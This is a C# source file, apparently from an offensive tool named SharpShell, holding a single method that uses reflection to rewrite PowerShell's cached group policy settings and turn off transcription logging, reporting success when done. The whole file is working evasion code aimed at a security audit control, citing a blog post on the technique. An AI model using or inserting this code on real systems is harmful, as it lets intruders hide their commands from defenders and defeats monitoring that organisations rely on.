using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Reflection;

namespace SharpShell
{
    public class PowershellLogging
    {
        public static void BypassLogging()
        {
            // PowerShell Enhanced Logging Capabilities Bypass
            // https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass
            try
            {
                // Use reflection to access the non-public cachedGroupPolicySettings field
                BindingFlags bindingFlags = BindingFlags.NonPublic | BindingFlags.Static;

                // Get the System.Management.Automation.Utils type
                Type utilsType = typeof(System.Management.Automation.PowerShell).Assembly
                    .GetType("System.Management.Automation.Utils");

                if (utilsType == null)
                {
                    Console.WriteLine("[-] Could not find Utils class in System.Management.Automation.");
                    return;
                }

                // Get the cachedGroupPolicySettings field using reflection
                FieldInfo cachedGroupPolicySettingsField = utilsType.GetField("cachedGroupPolicySettings", bindingFlags);
                if (cachedGroupPolicySettingsField == null)
                {
                    Console.WriteLine("[-] Could not find cachedGroupPolicySettings field.");
                    return;
                }

                // Retrieve the value of the cachedGroupPolicySettings field
                var cachedGroupPolicySettings = (ConcurrentDictionary<string, Dictionary<string, object>>)
                    cachedGroupPolicySettingsField.GetValue(null);

                // Modify the transcription settings
                Dictionary<string, object> newSettings = new Dictionary<string, object> { { "EnableTranscripting", "0" } };
                cachedGroupPolicySettings.GetOrAdd("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription", newSettings);

                Console.WriteLine("[+] PowerShell logging bypassed.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error bypassing PowerShell logging: " + ex.Message);
            }
        }
    }
}
